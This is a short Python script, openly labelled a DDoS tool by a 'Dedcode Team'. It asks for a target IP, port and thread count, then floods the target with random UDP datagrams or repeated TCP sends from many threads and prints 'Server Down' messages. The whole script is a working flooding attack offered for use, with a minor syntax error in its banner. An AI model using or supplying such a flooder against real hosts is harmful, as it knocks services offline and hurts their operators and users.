#by Mamank Sa-mp
import colorama
import random
import time
import socket
import threading
import sys
import os
# Reset
Color_Off="\[\033[0m\]"       # Text Reset
# Regular Colors
Black="\[\033[0;30m\]"        # Black
Red="\[\033[0;31m\]"          # Red
Green="\[\033[0;32m\]"        # Green
Yellow="\[\033[0;33m\]"       # Yellow
Blue="\[\033[0;34m\]"         # Blue
Purple="\[\033[0;35m\]"       # Purple
Cyan="\[\033[0;36m\]"         # Cyan
White="\[\033[0;37m\]"        # White

# Requests
os.system("clear")
print(White + f"З А Г Р У З К А....")
time.sleep(2.5)
os.system("clear")

print("=============")
print("🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼")
print("=Mastter DDos=")\n")

ip = str(input(" IP ══> "))
port = int(input(" Port ══> "))
choice = str(input(" Lanjut gak?(y/n) ══> "))
times = int(input(" Packets time ══> "))
threads = int(input(" Потоки (~800 лучше) ══> "))

os.system("clear")
os.system("figlet Attack Starting")
print ("[                   ] 0% ")
time.sleep(3)
print ("[=====              ] 25%")
time.sleep(3)
print ("[==========         ] 50%")
time.sleep(3)
print ("[===============    ] 75%")
time.sleep(3)
print ("[===================] 100%")
time.sleep(2)
os.system("clear")
time.sleep(2)
def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[x]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i + "|###[Ddos Attack] GO [Server]###|")
    except:
      print("[!] |###[Ddos Attack] GO [Server]###|")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[x]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" MANTAPPPPPP")
    except:
      s.close()
      print("[*] Server Down ")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
